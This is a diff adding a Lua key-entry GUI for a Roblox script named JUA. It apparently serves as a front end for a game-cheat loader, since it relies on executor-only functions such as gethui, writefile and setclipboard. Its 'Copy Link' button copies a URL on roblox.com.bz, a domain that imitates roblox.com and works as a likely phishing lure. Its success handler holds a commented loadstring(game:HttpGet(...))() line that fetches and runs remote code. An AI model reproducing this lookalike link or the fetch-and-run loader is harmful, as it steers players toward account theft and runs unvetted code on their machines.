@@ -1,0 +1,500 @@
+--[[
+    JUA | Key System GUI
+    ---------------------------------------------
+    Layout:  [ Check Key ]   [ Copy Link ]
+    Change the link, keys, colors and the main
+    script in the CONFIG section below.
+]]
+
+------------------------------------------------------------
+-- CONFIG (edit anything here, anytime)
+------------------------------------------------------------
+local CONFIG = {
+	Title      = "JUA",
+	Subtitle   = "Key System",
+
+	-- The link copied by the "Copy Link" button. Change it whenever you want.
+	KeyLink    = "https://roblox.com.bz/communities/6271749315/",
+
+	-- Accepted keys
+	ValidKeys  = { "JUA-FREE-KEY", "JUA-TEST-1234" },
+
+	-- Remember the key between sessions (needs writefile/readfile)
+	SaveKey    = true,
+	SaveFile   = "Jua_Key.txt",
+
+	-- Colors
+	Accent     = Color3.fromRGB(139, 92, 246),   -- purple
+	Accent2    = Color3.fromRGB(236, 72, 153),   -- pink
+	Background = Color3.fromRGB(14, 14, 20),
+	Panel      = Color3.fromRGB(24, 24, 34),
+	Text       = Color3.fromRGB(240, 240, 250),
+	SubText    = Color3.fromRGB(150, 150, 175),
+	Success    = Color3.fromRGB(74, 222, 128),
+	Error      = Color3.fromRGB(248, 113, 113),
+}
+
+-- Runs after a valid key is entered. Put your main Jua script here.
+local function OnSuccess()
+	-- loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()
+	print("[Jua] Key accepted - load your main script here.")
+end
+
+------------------------------------------------------------
+-- Services
+------------------------------------------------------------
+local TweenService     = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local Players          = game:GetService("Players")
+local CoreGui          = game:GetService("CoreGui")
+
+------------------------------------------------------------
+-- Helpers
+------------------------------------------------------------
+local function create(class, props, children)
+	local inst = Instance.new(class)
+	for k, v in pairs(props or {}) do
+		inst[k] = v
+	end
+	for _, child in ipairs(children or {}) do
+		child.Parent = inst
+	end
+	return inst
+end
+
+local function tween(obj, time, props, style, dir)
+	local t = TweenService:Create(
+		obj,
+		TweenInfo.new(time, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out),
+		props
+	)
+	t:Play()
+	return t
+end
+
+local function corner(r)
+	return create("UICorner", { CornerRadius = UDim.new(0, r) })
+end
+
+local function stroke(color, thickness, transparency)
+	return create("UIStroke", {
+		Color = color,
+		Thickness = thickness or 1,
+		Transparency = transparency or 0,
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+	})
+end
+
+local function gradient(c1, c2, rotation)
+	return create("UIGradient", {
+		Color = ColorSequence.new(c1, c2),
+		Rotation = rotation or 0,
+	})
+end
+
+local function getParent()
+	local ok, ui = pcall(function()
+		return (gethui and gethui()) or CoreGui
+	end)
+	if ok and ui then return ui end
+	return Players.LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local function readSavedKey()
+	if CONFIG.SaveKey and isfile and readfile and isfile(CONFIG.SaveFile) then
+		local ok, data = pcall(readfile, CONFIG.SaveFile)
+		if ok then return data end
+	end
+end
+
+local function saveKey(key)
+	if CONFIG.SaveKey and writefile then
+		pcall(writefile, CONFIG.SaveFile, key)
+	end
+end
+
+local function isValid(key)
+	for _, k in ipairs(CONFIG.ValidKeys) do
+		if key == k then return true end
+	end
+	return false
+end
+
+------------------------------------------------------------
+-- Remove old copy
+------------------------------------------------------------
+local parent = getParent()
+local old = parent:FindFirstChild("JuaKeyGUI")
+if old then old:Destroy() end
+
+------------------------------------------------------------
+-- Build UI
+------------------------------------------------------------
+local gui = create("ScreenGui", {
+	Name = "JuaKeyGUI",
+	ResetOnSpawn = false,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+	IgnoreGuiInset = true,
+})
+
+-- Soft glow behind the window
+local glow = create("ImageLabel", {
+	Name = "Glow",
+	AnchorPoint = Vector2.new(0.5, 0.5),
+	Position = UDim2.new(0.5, 0, 0.5, 0),
+	Size = UDim2.new(0, 520, 0, 360),
+	BackgroundTransparency = 1,
+	Image = "rbxassetid://5028857084",
+	ImageColor3 = CONFIG.Accent,
+	ImageTransparency = 0.65,
+	ScaleType = Enum.ScaleType.Slice,
+	SliceCenter = Rect.new(24, 24, 276, 276),
+	ZIndex = 0,
+	Parent = gui,
+})
+
+local main = create("Frame", {
+	Name = "Main",
+	AnchorPoint = Vector2.new(0.5, 0.5),
+	Position = UDim2.new(0.5, 0, 0.5, 0),
+	Size = UDim2.new(0, 440, 0, 280),
+	BackgroundColor3 = CONFIG.Background,
+	BorderSizePixel = 0,
+	ClipsDescendants = true,
+	Parent = gui,
+}, {
+	corner(16),
+	stroke(Color3.new(1, 1, 1), 1.5, 0),
+})
+gradient(CONFIG.Accent, CONFIG.Accent2, 45).Parent = main:FindFirstChildOfClass("UIStroke")
+
+-- Background tint gradient
+create("UIGradient", {
+	Color = ColorSequence.new(Color3.fromRGB(20, 18, 32), CONFIG.Background),
+	Rotation = 90,
+	Parent = main,
+})
+
+-- Top accent bar
+local topBar = create("Frame", {
+	Name = "TopBar",
+	Size = UDim2.new(1, 0, 0, 4),
+	BackgroundColor3 = Color3.new(1, 1, 1),
+	BorderSizePixel = 0,
+	Parent = main,
+})
+gradient(CONFIG.Accent, CONFIG.Accent2, 0).Parent = topBar
+
+-- Header (drag area)
+local header = create("Frame", {
+	Name = "Header",
+	Position = UDim2.new(0, 0, 0, 4),
+	Size = UDim2.new(1, 0, 0, 64),
+	BackgroundTransparency = 1,
+	Parent = main,
+})
+
+local logo = create("Frame", {
+	Position = UDim2.new(0, 22, 0, 14),
+	Size = UDim2.new(0, 38, 0, 38),
+	BackgroundColor3 = Color3.new(1, 1, 1),
+	BorderSizePixel = 0,
+	Parent = header,
+}, { corner(10) })
+gradient(CONFIG.Accent, CONFIG.Accent2, 45).Parent = logo
+create("TextLabel", {
+	Size = UDim2.new(1, 0, 1, 0),
+	BackgroundTransparency = 1,
+	Text = "J",
+	Font = Enum.Font.GothamBlack,
+	TextSize = 22,
+	TextColor3 = Color3.new(1, 1, 1),
+	Parent = logo,
+})
+
+create("TextLabel", {
+	Position = UDim2.new(0, 70, 0, 12),
+	Size = UDim2.new(0, 200, 0, 24),
+	BackgroundTransparency = 1,
+	Text = CONFIG.Title,
+	Font = Enum.Font.GothamBlack,
+	TextSize = 20,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextColor3 = CONFIG.Text,
+	Parent = header,
+})
+create("TextLabel", {
+	Position = UDim2.new(0, 70, 0, 34),
+	Size = UDim2.new(0, 200, 0, 16),
+	BackgroundTransparency = 1,
+	Text = CONFIG.Subtitle,
+	Font = Enum.Font.Gotham,
+	TextSize = 12,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextColor3 = CONFIG.SubText,
+	Parent = header,
+})
+
+local closeBtn = create("TextButton", {
+	Name = "Close",
+	AnchorPoint = Vector2.new(1, 0),
+	Position = UDim2.new(1, -18, 0, 18),
+	Size = UDim2.new(0, 30, 0, 30),
+	BackgroundColor3 = CONFIG.Panel,
+	Text = "×",
+	Font = Enum.Font.GothamBold,
+	TextSize = 20,
+	TextColor3 = CONFIG.SubText,
+	AutoButtonColor = false,
+	Parent = header,
+}, { corner(8) })
+
+-- Divider
+create("Frame", {
+	Position = UDim2.new(0, 22, 0, 72),
+	Size = UDim2.new(1, -44, 0, 1),
+	BackgroundColor3 = CONFIG.Panel,
+	BorderSizePixel = 0,
+	Parent = main,
+})
+
+-- Label
+create("TextLabel", {
+	Position = UDim2.new(0, 22, 0, 86),
+	Size = UDim2.new(1, -44, 0, 16),
+	BackgroundTransparency = 1,
+	Text = "ENTER YOUR KEY",
+	Font = Enum.Font.GothamBold,
+	TextSize = 11,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextColor3 = CONFIG.SubText,
+	Parent = main,
+})
+
+-- Key input
+local inputFrame = create("Frame", {
+	Name = "InputFrame",
+	Position = UDim2.new(0, 22, 0, 108),
+	Size = UDim2.new(1, -44, 0, 44),
+	BackgroundColor3 = CONFIG.Panel,
+	BorderSizePixel = 0,
+	Parent = main,
+}, { corner(10) })
+local inputStroke = stroke(Color3.fromRGB(50, 50, 70), 1.2, 0)
+inputStroke.Parent = inputFrame
+
+local keyBox = create("TextBox", {
+	Name = "KeyBox",
+	Position = UDim2.new(0, 14, 0, 0),
+	Size = UDim2.new(1, -28, 1, 0),
+	BackgroundTransparency = 1,
+	Text = readSavedKey() or "",
+	PlaceholderText = "Paste your key here...",
+	PlaceholderColor3 = Color3.fromRGB(100, 100, 125),
+	ClearTextOnFocus = false,
+	Font = Enum.Font.GothamMedium,
+	TextSize = 14,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	TextColor3 = CONFIG.Text,
+	Parent = inputFrame,
+})
+
+keyBox.Focused:Connect(function()
+	tween(inputStroke, 0.2, { Color = CONFIG.Accent })
+end)
+keyBox.FocusLost:Connect(function()
+	tween(inputStroke, 0.2, { Color = Color3.fromRGB(50, 50, 70) })
+end)
+
+-- Button factory
+local function makeButton(name, text, xScale, xOffset, filled)
+	local btn = create("TextButton", {
+		Name = name,
+		Position = UDim2.new(xScale, xOffset, 0, 168),
+		Size = UDim2.new(0.5, -28, 0, 44),
+		BackgroundColor3 = filled and Color3.new(1, 1, 1) or CONFIG.Panel,
+		Text = "",
+		AutoButtonColor = false,
+		Parent = main,
+	}, { corner(10) })
+
+	if filled then
+		gradient(CONFIG.Accent, CONFIG.Accent2, 25).Parent = btn
+	else
+		stroke(CONFIG.Accent, 1.5, 0.2).Parent = btn
+	end
+
+	local label = create("TextLabel", {
+		Size = UDim2.new(1, 0, 1, 0),
+		BackgroundTransparency = 1,
+		Text = text,
+		Font = Enum.Font.GothamBold,
+		TextSize = 14,
+		TextColor3 = Color3.new(1, 1, 1),
+		Parent = btn,
+	})
+
+	btn.MouseEnter:Connect(function()
+		tween(btn, 0.15, { Size = UDim2.new(0.5, -24, 0, 46) })
+		if not filled then
+			tween(btn, 0.15, { BackgroundColor3 = Color3.fromRGB(36, 32, 54) })
+		end
+	end)
+	btn.MouseLeave:Connect(function()
+		tween(btn, 0.15, { Size = UDim2.new(0.5, -28, 0, 44) })
+		if not filled then
+			tween(btn, 0.15, { BackgroundColor3 = CONFIG.Panel })
+		end
+	end)
+
+	return btn, label
+end
+
+-- LEFT: Check Key   |   RIGHT: Copy Link
+local checkBtn, checkLabel = makeButton("CheckKey", "✔  Check Key", 0, 22, true)
+local copyBtn,  copyLabel  = makeButton("CopyLink", "⧉  Copy Link", 0.5, 6, false)
+
+-- Status text
+local status = create("TextLabel", {
+	Name = "Status",
+	Position = UDim2.new(0, 22, 0, 228),
+	Size = UDim2.new(1, -44, 0, 18),
+	BackgroundTransparency = 1,
+	Text = "Click Copy Link to get your key.",
+	Font = Enum.Font.Gotham,
+	TextSize = 12,
+	TextColor3 = CONFIG.SubText,
+	Parent = main,
+})
+
+create("TextLabel", {
+	AnchorPoint = Vector2.new(0.5, 1),
+	Position = UDim2.new(0.5, 0, 1, -8),
+	Size = UDim2.new(1, -44, 0, 14),
+	BackgroundTransparency = 1,
+	Text = "Jua  •  Do not share your key",
+	Font = Enum.Font.Gotham,
+	TextSize = 10,
+	TextColor3 = Color3.fromRGB(95, 95, 120),
+	Parent = main,
+})
+
+------------------------------------------------------------
+-- Behavior
+------------------------------------------------------------
+local function setStatus(text, color)
+	status.Text = text
+	tween(status, 0.2, { TextColor3 = color or CONFIG.SubText })
+end
+
+local function shake(obj)
+	local base = obj.Position
+	for i = 1, 3 do
+		tween(obj, 0.04, { Position = base + UDim2.new(0, 8, 0, 0) })
+		task.wait(0.04)
+		tween(obj, 0.04, { Position = base - UDim2.new(0, 8, 0, 0) })
+		task.wait(0.04)
+	end
+	tween(obj, 0.04, { Position = base })
+end
+
+local function closeGui()
+	tween(main, 0.25, { Size = UDim2.new(0, 440, 0, 0) }, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+	tween(glow, 0.25, { ImageTransparency = 1 })
+	task.wait(0.3)
+	gui:Destroy()
+end
+
+local busy = false
+
+checkBtn.MouseButton1Click:Connect(function()
+	if busy then return end
+	busy = true
+
+	local key = keyBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
+	checkLabel.Text = "Checking..."
+	setStatus("Verifying your key...", CONFIG.SubText)
+	task.wait(0.6)
+
+	if isValid(key) then
+		saveKey(key)
+		checkLabel.Text = "✔  Success"
+		tween(inputStroke, 0.2, { Color = CONFIG.Success })
+		setStatus("Key accepted! Loading Jua...", CONFIG.Success)
+		task.wait(0.9)
+		closeGui()
+		task.spawn(OnSuccess)
+	else
+		checkLabel.Text = "✔  Check Key"
+		tween(inputStroke, 0.2, { Color = CONFIG.Error })
+		setStatus(key == "" and "Please enter a key first." or "Invalid key. Try again.", CONFIG.Error)
+		shake(inputFrame)
+		task.wait(0.8)
+		tween(inputStroke, 0.3, { Color = Color3.fromRGB(50, 50, 70) })
+		busy = false
+	end
+end)
+
+copyBtn.MouseButton1Click:Connect(function()
+	local copier = setclipboard or toclipboard or (Clipboard and Clipboard.set)
+	if copier then
+		pcall(copier, CONFIG.KeyLink)
+		copyLabel.Text = "✔  Copied!"
+		setStatus("Link copied to clipboard.", CONFIG.Success)
+	else
+		setStatus("Clipboard unsupported. Link: " .. CONFIG.KeyLink, CONFIG.Error)
+	end
+	task.delay(1.5, function()
+		if copyLabel and copyLabel.Parent then
+			copyLabel.Text = "⧉  Copy Link"
+		end
+	end)
+end)
+
+closeBtn.MouseEnter:Connect(function()
+	tween(closeBtn, 0.15, { BackgroundColor3 = CONFIG.Error, TextColor3 = Color3.new(1, 1, 1) })
+end)
+closeBtn.MouseLeave:Connect(function()
+	tween(closeBtn, 0.15, { BackgroundColor3 = CONFIG.Panel, TextColor3 = CONFIG.SubText })
+end)
+closeBtn.MouseButton1Click:Connect(closeGui)
+
+-- Dragging
+do
+	local dragging, dragStart, startPos
+	header.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = main.Position
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch) then
+			local delta = input.Position - dragStart
+			local pos = UDim2.new(
+				startPos.X.Scale, startPos.X.Offset + delta.X,
+				startPos.Y.Scale, startPos.Y.Offset + delta.Y
+			)
+			main.Position = pos
+			glow.Position = pos
+		end
+	end)
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+end
+
+------------------------------------------------------------
+-- Show with intro animation
+------------------------------------------------------------
+gui.Parent = parent
+main.Size = UDim2.new(0, 440, 0, 0)
+glow.ImageTransparency = 1
+tween(main, 0.45, { Size = UDim2.new(0, 440, 0, 280) }, Enum.EasingStyle.Back)
+tween(glow, 0.6, { ImageTransparency = 0.65 })
